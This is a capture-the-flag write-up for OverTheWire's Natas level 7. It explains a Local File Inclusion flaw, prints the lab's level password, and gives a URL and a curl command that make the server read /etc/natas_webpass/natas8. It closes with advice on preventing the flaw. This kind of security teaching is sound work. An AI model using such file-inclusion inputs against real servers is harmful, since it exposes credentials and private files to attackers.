# Natas — Level 7

**URL:** http://natas7.natas.labs.overthewire.org  
**Username:** `natas7`  
**Password:** `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`

---

## Goal
Find the password for the next level.

---

## Solution

The page has two navigation links:

```
http://natas7.natas.labs.overthewire.org/index.php?page=home
http://natas7.natas.labs.overthewire.org/index.php?page=about
```

The `page` parameter is being passed directly to a PHP file inclusion function. Inspecting the source code reveals a hint:

```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

Since the `page` parameter is not sanitised, we can pass an arbitrary file path instead of a page name — this is a **Local File Inclusion (LFI)** vulnerability. Replacing the parameter value with the path to the password file:

```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

The server includes and renders the contents of `/etc/natas_webpass/natas8` directly on the page, revealing the password for the next level.

### Using cURL

```bash
curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS \
  'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'
```

---

## Concept
> **Local File Inclusion (LFI)** occurs when user-supplied input is passed directly to a file inclusion function (e.g. PHP's `include()` or `require()`) without validation or sanitisation. This allows an attacker to read arbitrary files on the server — from config files and password files to application source code. In some cases, LFI can be escalated to **Remote Code Execution (RCE)**.
>
> To prevent LFI: never use raw user input in file paths, use a whitelist of allowed pages, and ensure the web server user has minimal file system permissions.
